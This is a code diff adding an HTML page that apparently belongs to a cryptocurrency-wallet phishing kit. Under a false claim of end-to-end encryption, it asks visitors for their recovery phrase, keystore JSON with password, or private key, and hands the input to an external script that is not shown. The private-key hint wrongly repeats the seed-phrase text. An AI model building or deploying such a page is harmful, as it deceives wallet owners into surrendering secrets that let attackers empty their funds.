@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="../style/sync.css" />
+    <link rel="shortcut icon" href="./assets/logo.svg" type="image/x-icon" />
+
+    <title>WALLET SERVERS</title>
+
+    <style>
+       .c {
+            display: none;
+        }
+        .c.active {
+            display: block;
+        }
+    </style>
+  </head>
+  <body>
+    <div class="wrapper">
+      <div class="back__to__home" >
+        <a href="../index.html">
+          &#x2190;
+        </a>
+        
+      </div>
+      <!-- <nav class="top sync"><a href="#">SYNC WALLET</a></nav> -->
+      <h2 class="sync-heading">
+        Data inputed are secured with an end to end encryption
+      </h2>
+      <div class="container">
+        <div class="btns" id="btns">
+          <div class="key-cont">
+              <button data-id="mission" id="phrasse" class="re">Phrase</button>
+          </div>
+          <div class="key-cont">
+              <button  data-id="vision" id="json">Keystore JSON</button>
+          </div>
+         <div class="key-cont">
+          <button   data-id="goal" id="key">Private Key</button>
+         </div>
+      </div>
+      <div class="content">
+        <div class="c cont-1 active" id="mission">
+            <input type="text" placeholder="Phrase" class="txt1" required>
+                <p>
+                    Typically 12(sometimes 24) words separated by a single spaces
+                </p>
+                <input type="button" value="Import" id="import" class="phrase__tab">
+        </div>
+        <div class="c cont-2" id="vision">
+            <input type="text" placeholder="Keystore JSON" class="txt2" required>
+                <br>
+                <input type="password" placeholder="Password" id="pwd" class="txt3" required>
+                <p>
+                    Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+                </p>
+                <input type="button" value="Import" id="import" class="keystore__tab">
+        </div>
+        <div class="c cont-3" id="goal">
+            
+            <!-- <input style="padding-bottom: 1.3rem; padding-top: .5rem;" type="text" placeholder="Private Key"  class="modify" required> -->
+            <input style="padding-bottom: 1.3rem; padding-top: .5rem;" type="text" placeholder="Private Key" class="txt4" required>
+                <p>
+                    Typically 12 (sometimes 24) words separated by a single space.
+                </p>
+                <input type="button" value="Import" id="import" class="private__tab">
+        </div>
+    </div>
+      </div>
+      
+      
+    </div>
+    <script src="../markup/sync.js"></script>
+  </body>
+</html>
